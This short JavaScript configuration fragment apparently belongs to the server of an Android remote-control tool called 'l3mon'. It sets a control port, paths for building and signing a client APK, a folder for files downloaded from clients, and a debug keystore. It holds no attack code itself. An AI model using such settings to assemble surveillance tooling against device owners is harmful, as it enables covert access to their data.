...
exports.control_port = 22533;

// Paths
exports.apkBuildPath = path.join(__dirname, '../public/l3mon/build.apk')
exports.apkSignedBuildPath = path.join(__dirname, '../public/l3mon/client.apk')

exports.downloadsFolder = '/l3mon/client_downloads'
exports.downloadsFullPath = path.join(__dirname, '../public/l3mon/client_downloads')
...
exports.keystorePath = path.join(__dirname, '../app/factory/', 'debug.keystore');
exports.keystoreAlias = 'androiddebugkey';
